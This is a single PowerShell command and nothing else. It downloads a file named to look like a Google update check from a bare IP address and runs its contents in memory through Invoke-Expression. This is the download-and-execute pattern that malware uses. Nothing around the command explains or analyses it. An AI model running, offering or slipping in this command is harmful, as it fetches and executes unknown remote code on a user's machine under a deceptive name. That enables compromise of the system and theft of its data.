
iex (New-Object Net.WebClient).DownloadString("http://84.200.84.187/Google Update Check.html")

